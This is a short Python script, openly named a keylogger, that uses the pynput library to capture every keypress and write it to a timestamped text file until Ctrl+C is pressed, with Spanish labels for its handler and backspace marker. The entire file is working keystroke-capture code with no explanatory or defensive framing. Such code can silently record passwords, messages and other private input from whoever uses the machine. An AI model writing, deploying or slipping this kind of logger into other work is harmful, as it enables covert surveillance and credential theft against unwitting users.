import datetime
from pynput.keyboard import Listener

d = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
#f = open('Keylogger_{}.txt'.format(d), 'w')
p =  open(f'Keylogger_{d}.txt', 'w')

def Registro(key):
    key = str(key)

    if key == "'\\x03'":
        p.close()
        quit()
    elif key == 'Key.enter':
        p.write('\n')
    elif key == 'Key.space':
        p.write(' ')
    elif key == 'Key.backspace':
        p.write('%Borrar%')
    else:
        p.write(key.replace("'", ""))


with Listener(on_press=Registro) as l:
    l.join()



